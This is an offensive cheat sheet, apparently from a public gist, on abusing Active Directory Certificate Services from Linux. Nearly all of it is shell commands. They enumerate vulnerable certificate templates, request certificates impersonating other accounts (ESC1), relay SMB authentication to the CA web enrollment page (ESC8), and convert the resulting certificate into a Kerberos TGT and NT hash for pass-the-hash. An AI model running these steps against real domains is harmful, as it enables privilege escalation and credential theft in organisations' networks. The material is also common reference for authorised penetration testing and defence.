# PKI Abuse

##
## https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250
##
##

Some golden links when you are having issues:
https://social.technet.microsoft.com/Forums/windows/en-US/96016a13-9062-4842-b534-203d2f400cae/ca-certificate-request-error-quotdenied-by-policy-module-0x80094800quot-windows-server-2008?forum=winserversecurity


## Enumerating ADCS On Linux

Download and install Certi
```shell
git clone https://github.com/eloypgz/certi
cd certi
sudo python3 setup.py install
```

Certi only support kerberos auth, so to perform authenticated enumeration, you need to fetch a TGT for a valid user first.
```shell
getTGT.py '<domain>/<username>:<password>' -dc-ip <dc-ip>
```
Set the env var to the output ccache

```shell
export KRB5CCNAME=<username>.ccache
```

Enumerate Certificate Authorities on the domain (CA's)
```shell
python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --class ca
```

Enumerate CA Services on the domain (Actual server names)
```shell
python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --class service
```

Enumerate vuln templates
```shell
python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --vuln --enable
```

## Requesting certs from CA Linux

 Requesting a cert with an alt subject name (ESC1)
 ```shell
python3 certi.py req '<domain>/<username>@<ca-server>' <ca-service-name> -k -n --dc-ip <dc-ip> --template <vuln-template> --alt-name <target-domain-account>
```

## Requesting cert by SMB relaying On Linux (ESC8)

Relaying incoming SMB connection to ADCS to generate a certificate on

Fetch and install a custom fork of impacket
```shell
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket
git checkout ntlmrelayx-adcs-attack
```

Create a virtual python env to contain this version of impacket (Avoid breaking the release you already have installed)
```shell
apt install python3-venv
python3 -m venv adcs-impacket
```

Move "into" this virutal env 
```shell
source adcs-impacket/bin/activate
```
Still inside the impacket folder

```shell
pip3 install .
```

You can now setup ntlmrelay for realying 
```shell
python3 examples/ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs --template <template-name>
```

## Authentication using certificate on Linux

Request an TGT on behalf of the account 
```shell
python3 gettgtpkinit.py <domain>/<username> -pfx-base64 $(cat <base64-cert.file>) -dc-ip <dc-ip> out_tgt.ccache
```

Set the env var to the output TGT ccache

```shell
export KRB5CCNAME=out_tgt.ccache
```

Get an NTHash for Pass-The-Hash from TGT, AS-REP-KEY-ENC is from the output of the command above.
```shell
python3 getnthash.py -key <AS-REP-ENC-KEY> -dc-ip <dc-ip> <domain>/<username>
```
